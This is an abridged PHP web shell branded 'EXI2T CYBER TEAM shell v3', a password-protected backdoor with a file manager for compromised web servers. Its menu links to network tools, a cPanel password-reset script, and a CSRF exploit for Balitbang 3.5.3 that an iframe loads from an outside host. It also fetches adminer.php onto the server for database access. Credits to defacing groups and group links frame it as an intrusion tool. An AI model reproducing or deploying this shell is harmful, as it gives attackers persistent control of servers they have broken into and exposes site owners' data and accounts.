<?php
$auth_pass = "b57f8c054cdbe73772b3a72144ae15eb"; // lenong
session_start();
error_reporting(0);
set_time_limit(0);
...
<html>
<head>
<title>EXI2T CYBER TEAM</title>
<link href='https://defacer.id/img/favicon.png' rel='icon' type='image/x-icon'/>
<style type="text/css">
html {
     background: url(https://i.pinimg.com/originals/71/fe/62/71fe624e6bb54a61daad19dfb0416ada.jpg) no-repeat;
...
<input type="text" value="EXI2T CYBER TEAM" title="you can't change this username." disabled=""></td></tr>
<tr><td><font color="lime" size="5" face="courier" new="">Password :</font></td><td>
<input type="password" name="pass"><center></center></td></tr>
...
<html>
<head>
<title>EXI2T CYBER TEAM shell v3</title>
<meta name='author' content='EXI2T CYBER TEAM SHELL v3'>
<meta charset="UTF-8">
<link href='https://www.neocabgame.com/img/favicon.png' rel='icon' type='image/x-icon'/>
<style type='text/css'>
...
echo '<div id="menu">';
echo "<BR>";
echo "<font size='6px' color='lime'></font>";
echo "<p>";
echo "<font color='lime'>Current DIR: </font>";
...
echo "<br><br><li> <a href='?dir=$dir&do=network'>network</a> </li>";
...
echo "<li> <a href='?dir=$dir&do=crp'>Cpanel RP</a> </li>";
echo "<li> <a href='?dir=$dir&do=balit'>CSRF Balitbang 3.5.3</a> </li>";
...
<!--
.single{
   border: 1px solid #00ff00;box-shadow: 0px 0px 20px #55FF55;
   padding: 5px;
}
.me  {
...
<tr><td><center><font color="gold">Discovering And Exploiting Security Flaws.
		<p><font color="Lavender">Thanks To : Rinto AR , ShinChan , PETR03X , Mr.x0x , IndoXploit, And Member N45HT | all member exi2t cyber team</font>
<br><a href="https://www.facebook.com/groups/747899365554004/">JOIN TO GROUP ECT REBORN</a>
<br><a href="https://www.facebook.com/ECT1337">FOR FANSPAGE ECT</a>
    <br><font color="Lavender"><font></font> <br>THIS SHELL RECODE FROM TERSERAH SHELL.
</td></tr>
...
############################
##Script Resetpass CP 2018##
##Coded By PiraTos S-Tn   ##
error_reporting(0);
$system = $_GET['be'];
if($system == 'pro'){
...
echo '<html>
    ...
    <p><h2>Script Resetpass CP</h2></p>
	 <p><h2>Coded By PiraTos S-Tn </h2></p>
	<p>   
...
} elseif($_GET['do'] == 'balit') {
	?>
	<center>
	<iframe src="http://www.siwarpdi5.com/fotowarga/test.php" width="800" height="200" style="border:none"></iframe>
	<?php
...
echo "</center></table>";  
    ...
    if(file_exists('adminer.php')) {
        ...
        if(adminer("https://www.adminer.org/static/download/4.6.3/adminer-4.6.3.php","adminer.php")) {
            echo "<center><font color=blue><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
    ...
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            ...
            foreach($scandir as $dirx) {
                ...
                echo "<tr>";
                 echo "<td class='td_home'><img src='http://www.stickpng.com/assets/images/580b57fcd9996e24bc43c4c3.png' width='35' height='35'>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 30px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        ...
        foreach($scandir as $file) {
            ...
            echo "<tr>";
            echo "<td class='td_home'><img src='http://icons.iconarchive.com/icons/zhoolego/material/512/Filetype-Docs-icon.png' width='35' height='35'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
    ...
    echo "<center>Copyright @ ".date("Y")." - EXI2T CYBER TEAM</font></a></center>";
	echo "<hr color='lime'>";
}
?>
